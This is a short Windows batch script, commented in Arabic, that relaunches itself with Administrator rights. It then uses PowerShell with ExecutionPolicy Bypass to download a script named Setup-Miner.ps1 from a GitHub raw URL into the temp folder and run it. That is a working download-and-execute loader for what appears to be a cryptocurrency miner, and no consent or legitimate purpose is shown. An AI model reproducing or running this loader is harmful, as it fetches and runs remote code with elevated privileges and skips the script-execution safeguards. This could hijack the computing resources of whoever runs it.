@echo off
:: يطلب صلاحية Administrator تلقائياً
net session >nul 2>&1 || (powershell -Command "Start-Process '%~f0' -Verb RunAs" & exit /b)

:: يشغّل السكريبت من الـ repo
powershell -ExecutionPolicy Bypass -Command "irm 'https://raw.githubusercontent.com/Mzagngy2026/helpquest/main/Setup-Miner.ps1?nocache=%RANDOM%' -OutFile $env:TEMP\Setup-Miner.ps1; & $env:TEMP\Setup-Miner.ps1"
pause